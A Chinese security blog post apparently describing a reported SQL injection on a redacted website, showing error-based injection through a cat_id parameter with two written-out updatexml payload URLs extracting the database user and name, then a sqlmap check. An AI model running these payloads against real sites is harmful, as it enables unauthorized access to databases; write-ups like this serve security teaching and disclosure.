#  【相关分享】记一次SQL注入漏洞   
原创 隼目安全  隼目安全   2025-01-17 00:03  
  
## 免责声明  
> ❝  
> 由于传播、利用本公众号"隼目安全"所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号"隼目安全"及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！  
  
  
本文中所涉及的相关漏洞已经向相关单位与平台进行报告，本文中图片、内容等均已脱敏！！！  
  
首先进入主页  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1Oz71n0YZF200RDJUUTMfKPx5n7iaDbJicBncbE3VGZLVOheDdGWtKMZwapTw97BQlCHxfmsZWFGmw/640?wx_fmt=png&from=appmsg "")  
  
随便点进去一个并找到这个数据包进行访问  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1Oz71n0YZF200RDJUUTMfKoxuUVmoIzy9ic74l6d1XibXkQbfxeVYv2wq4QZiaqhMlO1HPRfQQldbCg/640?wx_fmt=png&from=appmsg "")  
  
访问后再cat_id这里添加一个单引号显示报错  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1Oz71n0YZF200RDJUUTMfKeohSfnYlXL1kCxPDATGUSwFBzsLe3uaPApmr2Ol5apkF3vUFZvicxdg/640?wx_fmt=png&from=appmsg "")  
  
根据这个报错点进行分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1Oz71n0YZF200RDJUUTMfKeUdTkp5Vt66MUHhoIZ4ExjzXZ3sGJDUZQDy46WHH2APQsiciavCBiau3w/640?wx_fmt=png&from=appmsg "")  
  
进行报错注入获取下用户名  
```
payload:https://www.xxxxx.com/ajax/visitrecord/?table_name=doc_real&data_id=93682&cat_id=updatexml(1,concat(0x3a,user(),0x3a),3)&request_from=1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1Oz71n0YZF200RDJUUTMfKMvwk0p12gibU57JBUgPFgegQQYRllb6hwU3eoehrmoF2ezHA9mzrvEg/640?wx_fmt=png&from=appmsg "")  
  
成功报错获取到用户名后获取数据库库名  
```
payload：https://www.xxxxx.com/ajax/visitrecord/?table_name=doc_real&data_id=93682&cat_id=updatexml(1,concat(0x3a,database(),0x3a),3)&request_from=1
```  
  
使用sqlmap进行扫描后获取到存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1Oz71n0YZF200RDJUUTMfK4AnpibXMN0KRYmL44CdMyJTeIEcLxPcZYHVpv4lCeE8Y9J5icm6EcZlA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/9HKdHo8BvC1Oz71n0YZF200RDJUUTMfK6pIpNoNQaungK387qZnsnLdFA5IGG47t2BSIjwKcj93nIyeYWNWYzA/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9HKdHo8BvC1Oz71n0YZF200RDJUUTMfK9mVRWhFs7MnWxKmNnqiar6JT5g9EwgdHoMymWE3ZIicerhXsDRNOvskw/640?wx_fmt=png "")  
  
  
往期推荐  
  
  
  
[【相关分享】记一次小程序支付逻辑漏洞](http://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247488515&idx=1&sn=305bbcdc6b74a5b775bcad8028dbd7f1&chksm=c3560f51f4218647c07917f11c612b0e408756a42f53e74fbcd670e279eaba1e2d4e996c98a0&scene=21#wechat_redirect)  
  
  
[【相关分享】记一次小程序抓包支付漏洞](http://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247488490&idx=1&sn=f8724fe57ee0fae391d83baa2a71ce47&chksm=c35608b8f42181ae5a69f9681af8f736bc43b9044b75caca2bd4b722c9b07b9156bcdb312f73&scene=21#wechat_redirect)  
  
  
[【相关分享】记一次小程序逻辑漏洞](http://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247488478&idx=1&sn=0e94195de32c6cc2af2df00db511b92a&chksm=c356088cf421819a74006f84b8b0303caa10977a6b5a0cc383c79c8f4599c636bb5f72e54e35&scene=21#wechat_redirect)  
  
  
[【相关分享】记一次权限认证绕过](http://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247488460&idx=1&sn=bcd136fb32240369330732778bea5949&chksm=c356089ef4218188cba7bdb62665812585d71e9361de820439635d50d8e1693de14b7bb31b86&scene=21#wechat_redirect)  
  
  
[【相关分享】简述API安全](http://mp.weixin.qq.com/s?__biz=Mzk0OTUwNTU5Nw==&mid=2247488437&idx=1&sn=c71e2763d8c806f5730b3eb426386c16&chksm=c35608e7f42181f1d850ce889a512cecee2d7020a3a930d34c19ee131119e28e5a85756ec02e&scene=21#wechat_redirect)  
  
  
  
文稿 | 雾鲤  
  
制作 | x8i  
  
审发 | 隼目安全  
  
  
  
